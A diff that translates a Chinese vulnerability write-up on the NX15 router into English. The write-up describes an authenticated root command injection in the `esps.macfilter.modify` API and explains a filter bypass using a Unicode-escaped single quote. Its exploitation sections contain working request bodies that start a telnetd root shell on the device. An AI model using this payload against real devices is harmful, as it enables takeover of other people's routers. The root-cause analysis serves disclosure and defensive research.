@@ -1,41 +1,41 @@
-# NX15 R017 `esps.macfilter.modify` 后置独立 root RCE
+# NX15 R017 `esps.macfilter.modify` Post-Authentication Independent root RCE
 
-## 1. 结论
+## 1. Conclusion
 
-在 NX15 R017 上，`/api/esps` 的：
+On NX15 R017, the following `/api/esps` handler:
 
 - `object = esps.macfilter`
 - `method = modify`
 
-存在一条**新的、独立的、即时触发型后认证 root RCE**。
+contains a **new, independent, immediate-trigger post-authentication root RCE**.
 
-- **接口**：`POST /api/esps`
-- **对象**：`esps.macfilter`
-- **方法**：`modify`
-- **注入点**：`description`
-- **权限**：后认证（管理员会话）
-- **结果**：以 **root** 权限执行任意命令
-- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
-- **结论等级**：**Confirmed / Exploited**
+- **Endpoint**: `POST /api/esps`
+- **Object**: `esps.macfilter`
+- **Method**: `modify`
+- **Injection point**: `description`
+- **Privilege requirement**: post-authentication administrator session
+- **Impact**: arbitrary command execution as **root**
+- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
+- **Status**: **Confirmed / Exploited**
 
-本轮已实机确认：
+This round of testing confirmed on a physical device that:
 
-1. 直接原始单引号 `'` 会被 `/api/esps` 外层过滤挡住；
-2. 但用 JSON Unicode 转义 `'` 可把真实单引号送入后端 shell `eval`；
-3. 一次 `esps.macfilter.modify` 调用即可拉起 root shell；
-4. 即使 `userfilter.basicinfo.enable=disable`，且目标 MAC 并不存在，只要传入**合法格式的 MAC**，漏洞仍可稳定利用。
+1. A raw literal single quote `'` is blocked by the outer `/api/esps` filter.
+2. A JSON Unicode-escaped single quote `\u0027` can deliver a real single quote into the backend shell `eval`.
+3. A single `esps.macfilter.modify` call is sufficient to spawn a root shell.
+4. Even when `userfilter.basicinfo.enable=disable` and the target MAC does not already exist, the vulnerability remains reliably exploitable as long as a **syntactically valid MAC address** is supplied.
 
 ---
 
-## 2. 根因分析
+## 2. Root Cause Analysis
 
-目标脚本：
+Target script:
 
 - `/usr/libexec/rpcd/esps.macfilter`
 
-### 2.1 `modify` 接收可控 `description`
+### 2.1 `modify` accepts a controllable `description`
 
-在 `modify)` 分支中：
+In the `modify)` branch:
 
 ```sh
 json_get_var _mac mac
@@ -44,13 +44,13 @@ json_get_var _description description
 json_get_var _internet internet
 ```
 
-其中：
-- `_mac` 会做 `is_valid_mac()` 校验；
-- `_description` **不会做危险字符过滤**。
+Here:
+- `_mac` is validated with `is_valid_mac()`.
+- `_description` is **not filtered for dangerous characters**.
 
-### 2.2 即使该 MAC 不存在，脚本也会继续走到 sink
+### 2.2 The script continues to the sink even if the MAC does not exist
 
-若该 MAC 不在 `webrestriction` 里：
+If the MAC is not present in `webrestriction`:
 
 ```sh
 if [ "$check_repeat" -eq "0" ]; then
@@ -60,61 +60,59 @@ else
 fi
 ```
 
-也就是说，攻击者不必先预置一条现有项；
-只要传一个**合法格式**的全新 MAC，脚本就会先创建/补入条目，然后继续执行后面的危险逻辑。
+In other words, the attacker does not need to prepare an existing entry first. Supplying a brand-new MAC address in a **valid format** causes the script to create or add the entry first, then continue into the later dangerous logic.
 
-### 2.3 真正的命令注入 sink
+### 2.3 Actual command injection sink
 
-在 `code == 0` 的成功路径中：
+In the successful `code == 0` path:
 
 ```sh
 _list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
 eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
 ```
 
-这里有三个关键问题：
+There are three key problems:
 
-1. `_description` 直接进入 `_list`；
-2. `_list` 是**手工拼的 shell 片段**，不是安全的 JSON 序列化结果；
-3. 最后又进入了 `eval ...`，导致 shell 对整段字符串再次解析。
+1. `_description` is placed directly into `_list`.
+2. `_list` is a **manually assembled shell fragment**, not the result of safe JSON serialization.
+3. The fragment is then passed into `eval ...`, causing the shell to parse the whole string again.
 
-因此，一旦 `_description` 中出现真实单引号，就可以破坏 `eval` 里的 shell 语义，并在当前 root shell 上下文中执行攻击者命令。
+Therefore, once a real single quote appears in `_description`, it can break the shell syntax inside `eval` and execute attacker-controlled commands in the current root shell context.
 
-### 2.4 为什么需要 `'`
+### 2.4 Why a single quote is required
 
-直接在 HTTP 请求里放原始 `'`：
+Placing a raw literal `'` directly in the HTTP request:
 
 ```json
 {"description":"q';..."}
 ```
 
-会被 `/api/esps` 外层过滤器挡住，响应：
+is blocked by the outer `/api/esps` filter, which returns:
 
 ```json
 {"code":21,"message":"'"}
 ```
 
-但如果在**原始 JSON body** 中写：
+However, if the **raw JSON body** contains the single quote as a JSON Unicode escape:
 
 ```json
-{"description":"x';...;#"}
+{"description":"x\u0027;...;#"}
 ```
 
-则 JSON 解析后，脚本变量 `_description` 拿到的已经是真实单引号；
-同时又绕过了最外层的原始字符检查。
+then, after JSON parsing, the script variable `_description` already contains a real single quote, while the outer raw-character check has been bypassed.
 
 ---
 
-## 3. 关键静态证据
+## 3. Key Static Evidence
 
-### 3.1 `modify` 读取 `description`
+### 3.1 `modify` reads `description`
 
 ```sh
 json_get_var _description description
 json_get_var _internet internet
 ```
 
-### 3.2 不存在时会先新增当前用户项
+### 3.2 A current-user entry is added first when it does not already exist
 
 ```sh
 if [ "$check_repeat" -eq "0" ]; then
@@ -122,13 +120,13 @@ if [ "$check_repeat" -eq "0" ]; then
 fi
 ```
 
-### 3.3 危险 `_list` 手工拼接
+### 3.3 Dangerous manual construction of `_list`
 
 ```sh
 _list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
 ```
 
-### 3.4 `eval` 触发命令执行
+### 3.4 `eval` triggers command execution
 
 ```sh
 eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
@@ -136,11 +134,11 @@ eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
 
 ---
 
-## 4. 利用方式
+## 4. Exploitation Method
 
-### 4.1 直接原始单引号会失败
+### 4.1 A raw literal single quote fails
 
-请求：
+Request:
 
 ```json
 [
@@ -157,15 +155,15 @@ eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
 ]
 ```
 
-返回：
+Response:
 
 ```json
 {"code":21,"message":"'"}
 ```
 
-### 4.2 使用 `'` 绕过并打通 root RCE
+### 4.2 Bypassing with `\u0027` and obtaining root RCE
 
-成功请求示例：
+Example successful request:
 
 ```json
 [
@@ -175,14 +173,14 @@ eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
     "method": "modify",
     "param": {
       "mac": "AA:BB:CC:DD:EE:11",
-      "description": "z';echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
+      "description": "z\u0027;echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
       "internet": "true"
     }
   }
 ]
 ```
 
-这会在 `eval` 中把真实单引号送进 `_description`，最终以 root 身份执行：
+This causes a real single quote to be delivered into `_description` at the `eval` point and ultimately executes the following commands as root:
 
 ```sh
 echo MACMOD2_OK >/tmp/macmod2_ok
@@ -191,23 +189,23 @@ echo MACMOD2_OK >/tmp/macmod2_ok
 
 ---
 
-## 5. 动态验证
+## 5. Dynamic Verification
 
-### 5.1 设备默认状态下即可利用
+### 5.1 Exploitable in the device's default state
 
-验证时设备状态：
+Device state during verification:
 
 ```json
 [{"id":1,"result":{"message":"COMMON:Success","data":{"status":"disable","mode":"blacklist"},"code":0}}]
 ```
 
-即：
+This means:
 - `userfilter.basicinfo.enable = disable`
-- 不需要先开启“禁止新用户上网”运行时开关
+- The runtime switch for "forbid new users from accessing the Internet" does not need to be enabled first.
 
-### 5.2 新 MAC + `'` payload 直接成功
+### 5.2 New MAC + `\u0027` payload succeeds directly
 
-请求：
+Request:
 
 ```json
 [
@@ -217,20 +215,20 @@ echo MACMOD2_OK >/tmp/macmod2_ok
     "method": "modify",
     "param": {
       "mac": "AA:BB:CC:DD:EE:11",
-      "description": "z';echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
+      "description": "z\u0027;echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
       "internet": "true"
     }
   }
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":1,"result":{"message":"COMMON:Success","data":[],"code":0}}]
 ```
 
-随后连接 `192.168.8.1:2473`，得到：
+Then connecting to `192.168.8.1:2473` produced:
 
 ```text
 BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
@@ -240,9 +238,9 @@ Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
 MACMOD2_OK
 ```
 
-### 5.3 非法 MAC 时不会打到这条链
+### 5.3 An invalid MAC does not reach this chain
 
-请求：
+Request:
 
 ```json
 [
@@ -252,65 +250,65 @@ MACMOD2_OK
     "method": "modify",
     "param": {
       "mac": "BADMAC",
-      "description": "m';echo BADMAC_OK >/tmp/badmac_ok;/usr/sbin/telnetd -p 2477 -l /bin/sh >/dev/null 2>&1;#",
+      "description": "m\u0027;echo BADMAC_OK >/tmp/badmac_ok;/usr/sbin/telnetd -p 2477 -l /bin/sh >/dev/null 2>&1;#",
       "internet": "true"
     }
   }
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":1,"result":{"message":"QOS:Invalid MAC format","data":[],"code":5643}}]
 ```
 
-并且端口 `2477` **没有打开**。
+The port `2477` **did not open**.
 
-这说明：
-- `esps.macfilter.modify` 这条链本身仍受 `is_valid_mac()` 约束；
-- 其独立 root cause 是：**合法 MAC 校验通过后，`description` 落入 `eval` sink**。
-
----
-
-## 6. 与已知 `esps.macfilter add -> getlist` 存储型链的区别
-
-此前已确认的 `esps.macfilter.add -> getlist` 链是：
-
-- 先写入 `description`
-- 再由 `getlist` 读回时的 `eval` 触发执行
-
-而本条新链是：
-
-- **`modify` 一次调用即刻触发**
-- 不需要后续再调 `getlist`
-- 不依赖存储后回读
-
-因此它应单独计为：
-
-> **新的、即时型、独立 root RCE**
+This shows that:
+- The `esps.macfilter.modify` chain is still constrained by `is_valid_mac()`.
+- Its independent root cause is: **after a valid MAC passes validation, `description` reaches the `eval` sink**.
 
 ---
 
-## 7. 风险评估
+## 6. Difference from the Known `esps.macfilter add -> getlist` Stored Chain
 
-成功利用后，攻击者可：
+The previously confirmed `esps.macfilter.add -> getlist` chain works as follows:
 
-- 以 root 身份执行任意命令
-- 添加后门、篡改配置、提取凭据
-- 在一次普通的 `/api/esps` 管理请求中直接完成接管
+- Write `description` first.
+- Trigger execution later when `getlist` reads it back through `eval`.
 
-如果与此前已确认的预认证改密链组合，还可形成更短的完整接管链。
+This new chain works differently:
+
+- **A single `modify` call triggers execution immediately.**
+- No subsequent `getlist` call is required.
+- It does not rely on storing the payload and reading it back later.
+
+Therefore, it should be counted separately as a:
+
+> **new, immediate, independent root RCE**
+
+---
+
+## 7. Risk Assessment
+
+After successful exploitation, an attacker can:
+
+- Execute arbitrary commands as root.
+- Add backdoors, tamper with configuration, and extract credentials.
+- Take over the device through a single ordinary `/api/esps` management request.
+
+If combined with the previously confirmed pre-authentication password-change chain, it can form an even shorter complete takeover chain.
 
 ---
 
 ## 8. POC
 
-已落地 POC：
+Implemented POC:
 
 - `poc/postauth_esps_macfilter_modify_rce.py`
 
-运行示例：
+Execution example:
 
 ```bash
 python3 poc/postauth_esps_macfilter_modify_rce.py --cleanup --port 2472
@@ -318,25 +316,25 @@ python3 poc/postauth_esps_macfilter_modify_rce.py --cleanup --port 2472
 
 ![alt text](imag/image.png)
 
-POC 包含：
+The POC includes:
 
-1. 登录后台
-2. 生成合法测试 MAC
-3. 发送带 `'` 的 raw JSON body
-4. 等待并连接 root shell
-5. 证明 `id / uname / marker`
-6. 删除新建的 macfilter 项并清理 shell
+1. Logging in to the admin interface.
+2. Generating a valid test MAC address.
+3. Sending a raw JSON body containing `\u0027`.
+4. Waiting for and connecting to the root shell.
+5. Proving execution with `id / uname / marker`.
+6. Deleting the newly created macfilter entry and cleaning up the shell.
 
 ---
 
-## 9. 结论
+## 9. Conclusion
 
-`esps.macfilter.modify` 提供了一条新的**即时触发型后认证 root RCE**。根因是：
+`esps.macfilter.modify` provides a new **immediate-trigger post-authentication root RCE**. The root cause is:
 
-- `description` 未过滤；
-- `modify` 在成功路径中手工拼接 `_list`；
-- 随后将其送入 `eval ubus call usrlist modify_terminal_name ...`；
-- `'` 可以绕过外层原始单引号过滤，把真实单引号送入 shell；
-- 最终以 root 权限执行任意命令。
+- `description` is not filtered.
+- `modify` manually constructs `_list` in the success path.
+- The result is then passed into `eval ubus call usrlist modify_terminal_name ...`.
+- `\u0027` can bypass the outer raw single-quote filter and deliver a real single quote into the shell.
+- The final result is arbitrary command execution as root.
 
-这条链与先前的 `esps.macfilter add -> getlist` 存储型链互补，说明 `esps.macfilter` 不仅存在 stored command injection，还存在**immediate command injection**。
+This chain complements the earlier `esps.macfilter add -> getlist` stored chain, demonstrating that `esps.macfilter` contains not only stored command injection but also **immediate command injection**.
